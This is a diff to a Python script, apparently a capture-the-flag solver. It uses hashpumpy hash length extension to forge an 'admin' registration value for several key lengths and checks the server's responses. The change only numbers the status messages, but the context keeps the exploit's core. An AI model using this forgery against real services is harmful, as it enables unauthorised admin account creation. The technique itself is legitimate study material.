@@ -26,6 +26,7 @@ def main():
         data = hashpumpy.hashpump('4dd28ad0560441245de6fda3973890eeb41b702d', "admi", 'n', i)
         results.append(data)
 
+    j = 6
     for r in results:
         register_user = urllib.parse.quote_from_bytes(r[1])
         print("{} => {}".format(r[0], register_user))
@@ -36,20 +37,21 @@ def main():
         if status == 200:
             resp = data.getvalue().decode()
             if resp.find('Missing') > 0:
-                print("KO: Missing fields")
+                print("[{}] KO: Missing fields".format(j))
                 break 
             elif resp.find('Invalid') > 0: 
-                print("KO: Invalid fields")
+                print("[{}] KO: Invalid fields".format(j))
                 break
             elif resp.find('User exist') > 0:
-                print("KO: User exist, try with another email")
+                print("[{}] KO: User exist, try with another email".format(j))
                 break
             elif resp.find('Registered !') > 0:
-                print("OK: Registered")
+                print("[{}] OK: Registered".format(j))
             elif resp.find('email or password empty'):
-                print("KO: Hash doesn't work")
+                print("[{}] KO: Hash doesn't work".format(j))
             else:
                 print(resp)
+        j+=1
 
 if __name__ == "__main__":
     main()
